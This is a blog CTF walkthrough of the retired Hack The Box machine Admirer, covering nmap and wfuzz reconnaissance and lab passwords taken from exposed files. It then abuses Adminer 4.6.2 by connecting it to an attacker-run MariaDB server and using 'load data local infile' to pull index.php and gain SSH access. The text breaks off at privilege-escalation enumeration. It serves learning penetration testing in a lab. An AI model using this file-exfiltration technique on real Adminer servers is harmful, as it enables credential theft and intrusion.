<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Daniel Cano">
<meta name="description" content="Writeup about the Hackthebox retired machine Admirer 10.10.10.187">
<meta name="keywords" content="hacking, technology, programming">
<meta name="referrer" content="always">
<meta property="og:description" content="Writeup about the Hackthebox retired machine Admirer 10.10.10.187">
<meta property="og:title" content="Writeup Hackthebox HTB Admirer">
<meta property="og:url" content="https://u915.net/posts/2020/09/writeup-hackthebox-htb-admirer/">
<meta property="og:image" content="https://u915.net/images/logo_small.png" />
<title>Writeup Hackthebox HTB Admirer - u915</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
<link rel="icon" href="/images/favicon.png" type="image/x-icon">
<link rel="shortcut icon" href="/images/favicon_48_48.png">
</head>
<body>
<header>
  <div class="blog-header">
    <h1><a href="https://u915.net/">u915</a></h1>
    <div><a href="https://u915.net/"><img src="/images/logo_small.png" class="bloglogo"></img></a></div><h4>Daniel Cano Merch√°n - Hacking &amp; Tech</h4>
  </div>
  <nav><a href="/">Index</a><a href="/posts/">Posts</a><a href="/tags/">Tags</a><a href="/hacking-tools/">Tools</a><a href="/about/">About</a></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Writeup Hackthebox HTB Admirer</h1>
  </div>
<div class="meta">
  <div class="meta-bar">2020-09-26
  <span><a href="https://u915.net/tags/hacking/">#Hacking</a></span>
      <span><a href="https://u915.net/tags/hackthebox/">#Hackthebox</a></span>
      <span><a href="https://u915.net/tags/pentesting/">#Pentesting</a></span>
      </div>
  </div>
<div class="content">
  <h2 id="0---basic-info">0 - Basic info</h2>
<p>OS: Linux</p>
<p>IP: 10.10.10.187</p>
<h2 id="1---reconnaissance-and-enumeration">1 - Reconnaissance and enumeration</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -sC -O 10.10.10.187
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-07-30 20:15 CEST
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.187
Host is up <span style="color:#f92672">(</span>0.049s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
|_http-title: Admirer
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
TCP/IP fingerprint:
OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.80%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>7/30%OT<span style="color:#f92672">=</span>21%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>39042%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>I%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>5F230E5
OS:2%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10B%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>8<span style="color:#f92672">)</span>OPS
OS:<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M54DST11NW7%O2<span style="color:#f92672">=</span>M54DST11NW7%O3<span style="color:#f92672">=</span>M54DNNT11NW7%O4<span style="color:#f92672">=</span>M54DST11NW7%O5<span style="color:#f92672">=</span>M54DST1
OS:1NW7%O6<span style="color:#f92672">=</span>M54DST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>7120%W2<span style="color:#f92672">=</span>7120%W3<span style="color:#f92672">=</span>7120%W4<span style="color:#f92672">=</span>7120%W5<span style="color:#f92672">=</span>7120%W6<span style="color:#f92672">=</span>7120<span style="color:#f92672">)</span>ECN
OS:<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>7210%O<span style="color:#f92672">=</span>M54DNNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>A                                                                                                                                                                
OS:S%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R                                                                                                                                                                
OS:<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F                                                                                                                                                                
OS:<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%                                                                                                                                                                
OS:T<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD                                                                                                                                                                
OS:<span style="color:#f92672">=</span>S<span style="color:#f92672">)</span>                                                                                                                                                                                                                                     
	                                                                                                                                                                                                                                   
Network Distance: <span style="color:#ae81ff">2</span> hops                                                                                                                                                                                                                   
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                             
	                                                                                                                                                                                                                                   
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 21.77 seconds
</code></pre></div><p>Nothing useful on the port 80 just a static web site with images but the port 21 is interesting, FTP with vsftpd 3.0.3, searching exploits:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit vsftpd
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;CWD&#39;</span> <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Memory Consumption                                                                                                                                           | linux/dos/5814.pl
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                                                                                                                           | windows/dos/31818.sh
vsftpd 2.0.5 - <span style="color:#e6db74">&#39;deny_file&#39;</span> Option Remote Denial of Service <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                                                                                                                           | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                                                                         | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                                                                                                   | unix/remote/17491.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div><p>Nothing useful</p>
<p>robots.txt has disabled the directory <em>/admin-dir</em> , fuzzing with Gobuster, inside there are the files <em>contacts.txt</em> and <em>credentials.txt</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
<span style="color:#75715e">##########</span>
<span style="color:#75715e"># admins #</span>
<span style="color:#75715e">##########</span>
<span style="color:#75715e"># Penny</span>
Email: p.wise@admirer.htb

<span style="color:#75715e">##############</span>
<span style="color:#75715e"># developers #</span>
<span style="color:#75715e">##############</span>
<span style="color:#75715e"># Rajesh</span>
Email: r.nayyar@admirer.htb

<span style="color:#75715e"># Amy</span>
Email: a.bialik@admirer.htb

<span style="color:#75715e"># Leonard</span>
Email: l.galecki@admirer.htb

<span style="color:#75715e">#############</span>
<span style="color:#75715e"># designers #</span>
<span style="color:#75715e">#############</span>
<span style="color:#75715e"># Howard</span>
Email: h.helberg@admirer.htb

<span style="color:#75715e"># Bernadette</span>
Email: b.rauch@admirer.htb

<span style="color:#f92672">[</span>Internal mail account<span style="color:#f92672">]</span>
w.cooper@admirer.htb
fgJr6q#S<span style="color:#ae81ff">\W</span>:$P

<span style="color:#f92672">[</span>FTP account<span style="color:#f92672">]</span>
ftpuser
%n?4Wz<span style="color:#f92672">}</span>R$tTF7

<span style="color:#f92672">[</span>Wordpress account<span style="color:#f92672">]</span>
admin
w0rdpr3ss01!
</code></pre></div><p>Great, a lot of plain text passwords. Using the FTP account:</p>
<p><img src="/images/posts/htb_admirer_1.png" alt="alt text" title="inside FTP"></p>
<p>Inside there are a <em>dump.sql</em> and <em>html.tar.gz</em> seems to be backups files.</p>
<p>Looking inside <em>db_admin.php</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;waldo&#34;</span>;
$password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;]F7jLHw:*G&gt;UPrTo}~A&#34;</span>d6b<span style="color:#e6db74">&#34;;
</span></code></pre></div><p>Sadly not working via ssh&hellip;</p>
<p>Also, in the backup there is a file called, <em>admin_tasks.php</em>, open to internet:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;<span style="color:#f92672">html</span>&gt;                                                                                                                                                                             
&lt;<span style="color:#f92672">head</span>&gt;                  
  &lt;<span style="color:#f92672">title</span>&gt;Administrative Tasks&lt;/<span style="color:#f92672">title</span>&gt;                                                         
&lt;/<span style="color:#f92672">head</span>&gt;                                                                                       
&lt;<span style="color:#f92672">body</span>&gt;                                     
  &lt;<span style="color:#f92672">h3</span>&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/<span style="color:#f92672">h3</span>&gt;         
  <span style="color:#75715e">&lt;?php</span>                                                                                       
  <span style="color:#75715e">// Web Interface to the admin_tasks script                                                  
</span><span style="color:#75715e"></span>  <span style="color:#75715e">//                                                                                          
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;task&#39;</span>]))
  {                      
    $task <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;task&#39;</span>];
    <span style="color:#66d9ef">if</span>($task <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">||</span> $task <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#f92672">||</span> $task <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span> <span style="color:#f92672">||</span> $task <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span> <span style="color:#f92672">||</span>
       $task <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5&#39;</span> <span style="color:#f92672">||</span> $task <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;6&#39;</span> <span style="color:#f92672">||</span> $task <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;7&#39;</span>)
    {                                                                                                                                                                                       
      <span style="color:#e6db74">/*********************************************************************************** 
</span><span style="color:#e6db74">	 Available options:
</span><span style="color:#e6db74">	   1) View system uptime
</span><span style="color:#e6db74">	   2) View logged in users
</span><span style="color:#e6db74">	   3) View crontab (current user only)
</span><span style="color:#e6db74">	   4) Backup passwd file (not working)
</span><span style="color:#e6db74">	   5) Backup shadow file (not working)
</span><span style="color:#e6db74">	   6) Backup web data (not working)
</span><span style="color:#e6db74">	   7) Backup database (not working)
</span><span style="color:#e6db74">NOTE: Options 4-7 are currently NOT working because they need root privileges.
</span><span style="color:#e6db74">	         I&#39;m leaving them in the valid tasks in case I figure out a way
</span><span style="color:#e6db74">	         to securely run code as root from a PHP page.
</span><span style="color:#e6db74">      ************************************************************************************/</span>
      <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&lt;br /&gt;&#34;</span>, <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;/opt/scripts/admin_tasks.sh </span><span style="color:#e6db74">$task</span><span style="color:#e6db74"> 2&gt;&amp;1&#34;</span>));
    }
    <span style="color:#66d9ef">else</span>
    {
      <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;Invalid task.&#34;</span>);
    }
  } 
  <span style="color:#75715e">?&gt;</span>&lt;<span style="color:#f92672">p</span>&gt;
  &lt;<span style="color:#f92672">h4</span>&gt;Select task:&lt;/<span style="color:#f92672">p</span>&gt;
  &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>&gt;
    &lt;<span style="color:#f92672">select</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;task&#34;</span>&gt;
  &lt;<span style="color:#f92672">select</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;task&#34;</span>&gt;
      &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">1</span>&gt;View system uptime&lt;/<span style="color:#f92672">option</span>&gt;
      &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">2</span>&gt;View logged in users&lt;/<span style="color:#f92672">option</span>&gt;
      &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">3</span>&gt;View crontab&lt;/<span style="color:#f92672">option</span>&gt;
      &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">4</span> <span style="color:#a6e22e">disabled</span>&gt;Backup passwd file&lt;/<span style="color:#f92672">option</span>&gt;
      &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">5</span> <span style="color:#a6e22e">disabled</span>&gt;Backup shadow file&lt;/<span style="color:#f92672">option</span>&gt;
      &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">6</span> <span style="color:#a6e22e">disabled</span>&gt;Backup web data&lt;/<span style="color:#f92672">option</span>&gt;
      &lt;<span style="color:#f92672">option</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">7</span> <span style="color:#a6e22e">disabled</span>&gt;Backup database&lt;/<span style="color:#f92672">option</span>&gt;
    &lt;/<span style="color:#f92672">select</span>&gt;
    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;
  &lt;/<span style="color:#f92672">form</span>&gt;
&lt;/<span style="color:#f92672">body</span>&gt;
&lt;/<span style="color:#f92672">html</span>&gt;

</code></pre></div><p><img src="/images/posts/htb_admirer_2.png" alt="alt text" title="Admin tasks Admirer"></p>
<p>Obviously this file catched my attention because apparently it does administrative things and really juicy tasks like backing the passwd and shadow files&hellip;</p>
<p>I wasted time here trying to exploit the tool without luck so I supposed it was a rabbit hole.</p>
<p>Trying to fuzz again the path of the tool <em>administrative_tasks.php</em> looking for similar files, because I got a backup of the site maybe the admin is using the path for an upgraded tool or similar scripts:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
wfuzz -c -w /usr/share/wordlists/dirb/big.txt -z list,php-txt-html --hc 403,404 -t <span style="color:#ae81ff">100</span> -u http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/utility-scripts/FUZZ.FUZ2Z
Total requests: 61407

<span style="color:#f92672">===================================================================</span>
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                   
<span style="color:#f92672">===================================================================</span>

000005617:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">51</span> L     <span style="color:#ae81ff">235</span> W    <span style="color:#ae81ff">4158</span> Ch     <span style="color:#e6db74">&#34;adminer - php&#34;</span> 
</code></pre></div><p>Good, maybe the right path, adminer is a tool similar to phpMyAdmin, for database management and is similar to the box name.</p>
<p>And I got the DB user/pass found on <em>db_admin.php</em></p>
<p><img src="/images/posts/htb_admirer_3.png" alt="alt text" title="Adminer tool HTB"></p>
<h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
<p>Credentials did not work, but the version is easy to find <em>4.6.2</em>.</p>
<p>Searching vulnerabilities for the adminer version 4.6.2:</p>
<p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">serious-vulnerability-discovered-in-adminer-tool</a></p>
<p><a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">adminer-script-results-to-pwning-server-private-bug-bounty-program</a></p>
<h2 id="3---exploit">3 - Exploit</h2>
<p>So the flaw is Adminer is not managing correctly remote connections because is allowed to dump remote system data to our local database.</p>
<h3 id="local-database">Local database:</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
sudo mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
Your MariaDB connection id is <span style="color:#ae81ff">39</span>
Server version: 10.3.22-MariaDB-1 Debian buildd-unstable

Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.

MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; create database exploit;
Query OK, <span style="color:#ae81ff">1</span> row affected <span style="color:#f92672">(</span>0.000 sec<span style="color:#f92672">)</span>

MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; use exploit;
Database changed

MariaDB <span style="color:#f92672">[</span>exploit<span style="color:#f92672">]</span>&gt; CREATE DATABASE dummy;
Query OK, <span style="color:#ae81ff">1</span> row affected <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>

MariaDB <span style="color:#f92672">[</span>exploit<span style="color:#f92672">]</span>&gt; use dummy;
Database changed
MariaDB <span style="color:#f92672">[</span>dummy<span style="color:#f92672">]</span>&gt; CREATE USER <span style="color:#e6db74">&#39;dummy&#39;</span>@<span style="color:#e6db74">&#39;%&#39;</span> IDENTIFIED BY <span style="color:#e6db74">&#39;dummy_admirer&#39;</span>;
Query OK, <span style="color:#ae81ff">0</span> rows affected <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>

MariaDB <span style="color:#f92672">[</span>dummy<span style="color:#f92672">]</span>&gt; create table dummy<span style="color:#f92672">(</span>data VARCHAR<span style="color:#f92672">(</span>255<span style="color:#f92672">))</span>;
Query OK, <span style="color:#ae81ff">0</span> rows affected <span style="color:#f92672">(</span>0.009 sec<span style="color:#f92672">)</span>

MariaDB <span style="color:#f92672">[</span>dummy<span style="color:#f92672">]</span>&gt; GRANT ALL PRIVILEGES ON * . * TO <span style="color:#e6db74">&#39;dummy&#39;</span>@<span style="color:#e6db74">&#39;%&#39;</span>;
Query OK, <span style="color:#ae81ff">0</span> rows affected <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>

MariaDB <span style="color:#f92672">[</span>dummy<span style="color:#f92672">]</span>&gt; FLUSH PRIVILEGES;
Query OK, <span style="color:#ae81ff">0</span> rows affected <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>

MariaDB <span style="color:#f92672">[</span>dummy<span style="color:#f92672">]</span>&gt; exit
Bye
</code></pre></div><p>Next step is to open the database to internet:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
</code></pre></div><p>Changing the bind-address to 0.0.0.0 to be open:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">	bind-address <span style="color:#f92672">=</span> 0.0.0.0 
</code></pre></div><p>Restart the database service to apply the changes:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">	sudo systemctl restart mysql
</code></pre></div><h3 id="configuring-adminer-to-use-my-local-database">Configuring Adminer to use my local database:</h3>
<p>In the login panel using:</p>
<ul>
<li>system: <em>mysql</em></li>
<li>username: dummy</li>
<li>server: local htb vpn ip</li>
</ul>
<h3 id="dumping-data">Dumping data:</h3>
<p>Worked, inside Adminer the panel, the SQL Command editor</p>
<p><img src="/images/posts/htb_admirer_4.png" alt="alt text" title="Adminer panel HTB"></p>
<p>Next step is dumping the file <em>index.php</em>.</p>
<p><em>Why index.php?</em> because I know there are credentials inside looking the old web backup I found on the FTP. The old credentials did not work so maybe the credentials changed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">	<span style="color:#66d9ef">load</span> <span style="color:#66d9ef">data</span> <span style="color:#66d9ef">local</span> infile <span style="color:#960050;background-color:#1e0010">‚Äò</span><span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#960050;background-color:#1e0010">‚Äô</span> <span style="color:#66d9ef">into</span> <span style="color:#66d9ef">table</span> dummy;
</code></pre></div><p><img src="/images/posts/htb_admirer_5.png" alt="alt text" title="dumping data to my local database"></p>
<p>Worked, as I figured out before there are credentials inside and are different to the old ones.</p>
<p><img src="/images/posts/htb_admirer_6.png" alt="alt text" title="Dumped data"></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	$username = &#34;waldo&#34;; 
	$password = &#34;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&#34;;
</code></pre></div><h3 id="machine-access-and-user-flag">Machine access and user flag</h3>
<p>Testing the credentials via ssh:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
ssh waldo@10.10.10.187

waldo@10.10.10.187<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
</code></pre></div><p>Great, I am in and I got a low privileged account.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt 
09XXXXXXXXXXXXXXXXX45
</code></pre></div><h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
<p>Checking sudo permissions:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:~$ sudo -l
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> waldo: 
Matching Defaults entries <span style="color:#66d9ef">for</span> waldo on admirer:
    env_reset, env_file<span style="color:#f92672">=</span>/etc/sudoenv, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin, listpw<span style="color:#f92672">=</span>alwaysUser waldo may run the following commands on admirer:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: /opt/scripts/admin_tasks.sh
</code></pre></div><p>So sudo is available on <em>/opt/scripts/admin_tasks.sh</em>. Checking what is inside the path <em>/opt/scripts</em> and studying the files: <em>admin_tasks.php</em> and <em>backup.py</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">waldo@admirer:/opt/scripts$ ls -lrta
total <span style="color:#ae81ff">16</span>
drwxr-xr-x <span style="color:#ae81ff">3</span> root root   <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">2019</span> ..
